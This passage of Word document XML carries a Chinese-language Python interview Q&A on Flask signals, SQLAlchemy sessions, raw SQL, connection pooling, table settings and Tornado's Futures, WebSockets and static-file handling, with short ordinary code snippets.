          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求上下文执行完毕后自动执行（无论成功与否）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14070755"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appcontext_pushed = _signals.signal('appcontext-pushed')  #</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>app</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>上下文</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>push</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>时执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CB0F49C"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appcontext_popped = _signals.signal('appcontext-popped')  #</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求上下文</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>pop</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>时执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BA4EF5E"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message_flashed = _signals.signal('message-flashed')#</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>调用</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>flask</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>在其中添加数据时，自动触发</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="617FDC29" w14:textId="27EC1DF9"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078</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SQLAlchemy</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中的</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> session</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">scoped_session </w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="012E0A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Session：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E4769C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由于无法提供线程共享功能，开发时要给每个线程都创建自己的session</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74B1F6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打印sesion可知他是sqlalchemy.orm.session.Session的对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A5101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scoped_session：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40BAE20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为每个线程都创建一个session，实现支持线程安全</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C7D201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在整个程序运行的过程当中，只存在唯一的一个session对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4746245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创建方式:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68ED311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通过本地线程Threading.Local()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E801E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session=scoped_session(Session)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4424154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创建唯一标识的方法(参考flask请求源码)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37520CE8" w14:textId="5AD771E0"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079</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SQLAlchemy</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>如何执行原生</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61C5E34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w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>execute</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>方法直接操作SQL语句(导入create_engin、sessionmaker)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FAC906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engine = create_engine('mysql://root:*****@127.0.0.1/database?charset=utf8')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A2BA99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DB_Session = sessionmaker(bind=engine)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1814C85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session = DB_Session()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="705763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session.</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>execute</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>('alter table mytablename drop column mycolumn ;')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="638F913D" w14:textId="1A1330E8"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080</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ORM</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的实现原理？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15C3B63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ORM的实现基于一下三点</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10331D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映射类：描述数据库表结构，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13F6DB7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映射文件：指定数据库表和映射类之间的关系</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="004E910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数据库配置文件：指定与数据库连接时需要的连接信息(数据库、登录用户名、密码or连接字符串)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="611E1B0C" w14:textId="2221C73C"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081</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DBUtils</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>模块的作用？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B0077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数据库连接池</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C0760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使用模式：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02196E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1、为每个线程创建一个连接，连接不可控，需要控制线程数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="249F601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2、创建指定数量的连接在连接池，当线程访问的时候去取，不够了线程排队，直到有人释放(推荐)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1136C9E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7DED329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两种写法：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FBB56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1、用静态方法装饰器，通过直接执行类的方法来连接使用数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20E99FE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2、通过实例化对象，通过对象来调用方法执行语句</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DA8776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https://www.cnblogs.com/ArmoredTitan/p/Flask.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F86D87" w14:textId="77777777" w:rsidR="001E7149" w:rsidRPr="00BF3003" w:rsidRDefault="001E7149" w:rsidP="001E7149">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:before="150" w:after="150"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>以下</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>SQLAlchemy</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的字段是否正确？如果不正确请更正：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F8E8AB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datetime import datetime</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A6D65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sqlalchemy.ext.declarative</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01D9059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import declarative_base</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DB8BA3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sqlalchemy import Column, Integer, String, DateTime</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32CC9E9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EEC995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Base = declarative_base()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05C4597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UserInfo(Base):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58A89AD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__tablename__ = 'userinfo'   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="574A2DC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 = Column(Integer, primary_key=True, autoincrement=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53CB4A8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 = Column(String(64), unique=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38F6834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ctime = Column(DateTime, default=datetime.now())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6416B5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5637010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更正：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="172F35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ctime 字段中参数应为’default=datetime.now’，now后面不应该加括号，加了的话，字段不会实时更新。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0916B0D9" w14:textId="24120128"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082</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SQLAchemy</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中如何为引擎和表设置字符编码？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="468B379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 设置引擎编码方式为utf8。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65E095F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engine = create_engine("mysql+pymysql://user:password@127.0.0.1:3306/db01?charset=utf8")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73E6E79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 设置数据库表编码方式为utf8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C4FA68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UserType(Base):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B39F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__tablename__ = 'usertype'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03F99B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 = Column(Integer, primary_key=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C1275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caption = Column(String(50), default='管理员')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="220F131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添加配置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="375C351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__table_args__ = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="676CB39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'mysql_charset': 'utf8'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="503300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FA320A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这样生成的SQL语句就自动设置数据表编码为utf8了，__table_args__还可设置存储引擎、外键约束等等信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="402840BE" w14:textId="3A89F55D"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083</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SQLAchemy</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中如何设置联合唯一索引？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63489AF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通过'UniqueConstraint'字段来设置联合唯一索引</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D67CFE2"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__table_args__ = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4401643C" w14:textId="77777777" w:rsidR="00D8288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UniqueConstraint('hid', 'username', name='hid_username_i')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="736D6BFD" w14:textId="229EDFEE"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47D4B1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#hid和username组成联合唯一约束。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45AD97E4" w14:textId="4D948520"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084</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简述</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Tornado</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>框架的特点</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FA8DBD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异步非阻塞+websocket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C06DB63" w14:textId="46CB14D5"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085</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简述</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Tornado</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>框架中</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Future</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>对象的作用？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E1B50B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实现异步非阻塞</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68F437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视图函数yield一个future对象，future对象默认：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C0B8E3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self._done = False   ，请求未完成</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="625C19D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self._result = None  ，请求完成后返回值，用于传递给回调函数使用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0259288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tornado就会一直去检测future对象的_done是否已经变成True。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="317566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如果IO请求执行完毕，自动会调用future的set_result方法：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FFBDE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self._result = result</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CA63E7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self._done = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10B6474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参考：http://www.cnblogs.com/wupeiqi/p/6536518.html（自定义异步非阻塞web框架）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BD81FC4" w14:textId="1FF73314"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086</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Tornado</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>框架中如何编写</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>WebSocket</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>程序？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D4780E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Tornado在websocket模块中提供了一个WebSocketHandler类。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B295B4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这个类提供了和已连接的客户端通信的WebSocket事件和方法的钩子。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C9EF37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当一个新的WebSocket连接打开时，open方法被调用，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68EF7CF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而on_message和on_close方法，分别在连接、接收到新的消息和客户端关闭时被调用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4698F9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此外，WebSocketHandler类还提供了write_message方法用于向客户端发送消息，close方法用于关闭连接。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75A59633" w14:textId="094775A9"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087</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Tornado</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中静态文件是如何处理的？</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00B00DDE">
        <w:rPr>
          <w:rFonts w:ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>如：</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;link href="{{static_url("commons.css")}}" rel="stylesheet" /&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C8006E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settings.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0696C19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settings = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="608D6B5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"static_path": os.path.join(os.path.dirname(__file__), "static"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C5BA5E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指定了静态文件的位置在当前目录中的"static"目录下</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52F8325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"cookie_secret": "61oETzKXQAGaYdkL5gEmGeJJFuYh7EQnp2XdTP1o/Vo=",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B0CA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"login_url": "/login",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1743BA9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"xsrf_cookies": True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C59642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2C651D3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经上面配置后</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E1DAA8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static_url()自动去配置的路径下找'commons.css'文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1323F30F" w14:textId="2104F2EA"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088</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Tornado</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>操作</w:t>
      </w:r>
